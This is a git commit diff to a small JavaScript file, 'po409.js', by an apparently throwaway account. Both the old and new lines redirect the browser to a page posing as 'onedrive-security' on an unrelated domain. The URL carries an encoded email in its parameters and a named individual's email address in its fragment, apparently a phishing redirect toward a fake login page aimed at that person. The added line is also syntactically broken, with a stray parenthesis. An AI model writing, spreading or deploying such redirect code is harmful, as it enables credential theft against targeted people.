2b096fdc9600671c99840b6ed456dc82eee80dcc
tanjanegineering-oss <tanjanegineering@gmail.com>
2026-04-30 23:01:16 -0700

    Update po409.js

--- po409.js
+++ po409.js
@@ -1,4 +1,4 @@
 
-    window.location.assign("https://onedrive-security.aeroform-composite.com/bot/pdfs101.htm?onedrive=aWJlbndhQHFxLmNvbQ%3D%3D&_r=yZdPVI8#Daniyal.uddin@samipharma.com.pk");
+   window.location.href = "https://onedrive-security.aeroform-composite.com/bot/pdfs101.htm?onedrive=aWJlbndhQHFxLmNvbQ%3D%3D&_r=yZdPVI8#Daniyal.uddin@samipharma.com.pk");
 
 	
